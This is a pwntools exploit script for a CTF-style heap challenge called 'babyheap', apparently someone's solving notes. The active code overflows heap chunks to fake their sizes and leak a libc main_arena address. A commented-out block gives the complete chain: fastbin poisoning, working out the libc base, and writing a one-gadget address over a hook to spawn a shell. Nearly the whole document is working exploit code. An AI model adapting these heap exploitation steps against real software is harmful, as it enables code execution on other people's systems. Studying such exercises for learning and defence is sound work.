from pwn import *

context.log_level='debug'
p=process('./babyheap')

def alloc(size):
	p.recvuntil('Command: ')
	p.sendline('1')
	p.recvuntil('Size')
	p.sendline(str(size))

def fill(index, content):	
	p.recvuntil('Command: ')
	p.sendline('2')
	p.recvuntil('Index: ')
	p.sendline(str(index))
	p.recvuntil('Size: ')
	p.sendline(str(len(content)))
	p.recvuntil('Content: ')	
	p.sendline(content)


def free(index):
	p.recvuntil('Command: ')
	p.sendline('3')
	p.recvuntil('Index: ')
	p.sendline(str(index))

def dump(index):
	p.recvuntil('Command: ')
	p.sendline('4')
	p.recvuntil('Index: ')
	p.sendline(str(index))


alloc(0x30)
alloc(0x10)
alloc(0x100)

gdb.attach(p, 'b*0x55555555516c')
payload='A'*0x30 + p64(0) + p64(0x41) + 'B'*0x30 + p64(0) + p64(0x41) 
fill(0,payload)
free(1)
alloc(0x30)

payload='A'*0x10 + p64(0) + p64(0x111)
fill(1,payload)

free(2)

dump(1)
main_arena=u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
success(hex(main_arena))




alloc(0x10)


p.interactive()



"""
alloc(0x10) #0
alloc(0x10) #1
alloc(0x10) #2
alloc(0x10) #3
alloc(0x80) #4

gdb.attach(p, 'b*0x55555555516c')
#for placing the chunk4(smallbin) to the fastbin list 
free(1)
free(2)

payload ='A'*0x10 #the data of chunk0
payload+=p64(0) + p64(0x21) + 'A'*0x10 #chunk1
payload+=p64(0) + p64(0x21) + p8(0xe0)  #chunk2

fill(0,payload) #using fill() to overwrite the fd of the chunk2 which is placed in fastbin list, to make it point to chunk4 

payload='A'*0x10 + p64(0) + p64(0x21) #the header of chunk4
fill(3, payload) #using fill(3) to overwrite the header of chunk4, create a fake header, so alloc() can get the point to chunk4 


payload ='A'*0x10 #the data of chunk3
alloc(0x10)
alloc(0x10)#get the index to chunk2

#free smallbin to get the main_arena_addr in its fd
#fix the chunk4 header first
payload='A'*0x10 + p64(0) + p64(0x91)
fill(3, payload)

free(4) #populated the fd of the chunk4 with main_arena addr

dump(2)

main_arena=u64( p.recvuntil('\x7f')[-6:] + '\x00\x00')
success(hex(main_arena))


alloc(0x60) #4
alloc(0x60) #5
alloc(0x60) #6



free(5)
free(6)

payload='A'*0x60 + p64(0) + p64(0x71) + 'A'*0x60 + p64(0) + p64(0x71) + p64(main_arena-0x8b)
fill(4, payload)

alloc(0x60)
alloc(0x60)


libc_base=main_arena-0x3c4b20-0x58
success(hex(libc_base))
execve_addr = libc_base + 0x4526a

payload='A'*19 + p64(execve_addr)
fill(6,payload)

#gdb.attach(p, 'b*0x555555554dc9')
alloc(0x10)





p.interactive()

"""


